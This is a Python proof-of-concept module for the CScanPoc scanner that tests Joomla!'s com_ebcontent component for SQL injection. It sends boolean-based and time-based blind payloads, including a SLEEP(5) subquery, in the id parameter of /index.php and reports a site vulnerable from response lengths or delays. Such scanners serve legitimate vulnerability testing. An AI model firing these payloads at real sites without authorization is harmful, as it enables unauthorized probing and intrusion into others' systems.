# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'Joomla_0022'  # 平台漏洞编号，留空
    name = 'Joomla! SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        Joomla! /index.php 存在多处SQL漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Joomla!'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'be49cd2a-0888-4fc0-bc74-9907f90a7d4c'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            payload0 = '/index.php?option=com_ebcontent&view=article&tmpl=component&id=37&cid=20&print=1&Itemid=14&lang=vn'
            payload1 = '/index.php?option=com_ebcontent&view=article&tmpl=component&id=37%27%20AND%207599=7599%20AND%20%27gefD%27=%27gefD&cid=20&print=1&Itemid=14&lang=vn'
            payload2 = '/index.php?option=com_ebcontent&view=article&tmpl=component&id=37%27%20AND%207599=7299%20AND%20%27gefD%27=%27gefD&cid=20&print=1&Itemid=14&lang=vn'
            payload3 = "/index.php?option=com_ebcontent&view=article&id=37%27%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))mbyz)%20AND%20%27dIwT%27=%27dIwT&cid=29&Itemid=129&lang=vn"
            url0 = self.target + payload0
            url1 = self.target + payload1
            url2 = self.target + payload2
            url3 = self.target + payload3
            first_start_time = time.time()
            code0, head0, body0, _, _ = hh.http(url0)
            first_end_time = time.time()
            T1 = first_end_time - first_start_time

            code1, head1, body1, _, _ = hh.http(url1)
            code2, head2, body2, _, _ = hh.http(url2)
            seconde_start_time = time.time()
            code3, head3, body3, _, _ = hh.http(url3)
            seconde_end_time = time.time()
            T2 = seconde_end_time - seconde_start_time

            if code0 == code1 == 200 and len(body0) == len(body1) != len(body2):
                #security_hole('Joomla com_ebcontent SQL injection boolean-based blind'+url1)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
            elif 4.5 < T2-T1:
                #security_hole('Joomla com_ebcontent SQL injection Time-based blind'+url3)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
